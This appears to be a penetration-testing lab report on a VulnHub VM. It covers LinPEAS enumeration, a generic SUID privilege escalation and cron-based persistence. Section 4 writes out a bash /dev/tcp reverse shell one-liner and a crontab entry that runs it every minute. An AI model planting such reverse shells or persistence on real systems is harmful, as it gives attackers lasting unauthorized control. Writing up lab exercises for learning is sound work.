# Privilege Escalation and Persistence Lab Report
## 1. Objective

To perform privilege escalation on a vulnerable VM and establish persistence using post-exploitation techniques.

## 2. Lab Environment
Attacker Machine: Kali Linux

Target Machine: VulnHub VM
Target IP: 192.168.56.5
Tools Used: Meterpreter, LinPEAS, PowerSploit

## 3. Privilege Escalation
## 3.1 Enumeration

Uploaded and executed LinPEAS on the target system:
chmod +x linpeas.sh
./linpeas.sh

Key findings:
Multiple SUID binaries detected
Misconfigured permissions on system binaries
Potential privilege escalation vectors identified

## 3.2 Exploitation
Identified vulnerable SUID binary

Exploited using privilege escalation technique:

./vulnerable_binary -p
Successfully escalated privileges to root

## 3.3 Result Log

Task ID	Technique	Target IP	Status	Outcome
010	SUID Exploit	192.168.56.5	Success	Root Shell

## 4. Persistence
## 4.1 Method Used: Cron Job Persistence

Created a reverse shell script:

echo "bash -i >& /dev/tcp/192.168.1.X/4444 0>&1" > /tmp/shell.sh
chmod +x /tmp/shell.sh

Added cron job:

crontab -e

Inserted:

* * * * * /tmp/shell.sh
## 4.2 Persistence Summary

A cron job was configured to execute a reverse shell script every minute. This ensures persistent access even after system reboot or session termination. The script reconnects to the attacker's machine, maintaining control over the compromised system without requiring re-exploitation.

## 5. Post-Exploitation 

Verified root access:

whoami
Checked system stability after exploitation
Ensured persistence mechanism works after reboot simulation

## 6. Key Learnings
Enumeration is critical for identifying privilege escalation vectors
SUID misconfigurations are common and exploitable
Persistence ensures long-term access beyond initial compromise
Cron jobs provide simple and effective persistence mechanisms

## 7. Conclusion

Privilege escalation was successfully achieved through SUID exploitation, resulting in root access. A cron-based persistence mechanism was implemented to maintain access. The lab demonstrates a realistic post-exploitation workflow used in penetration testing engagements.
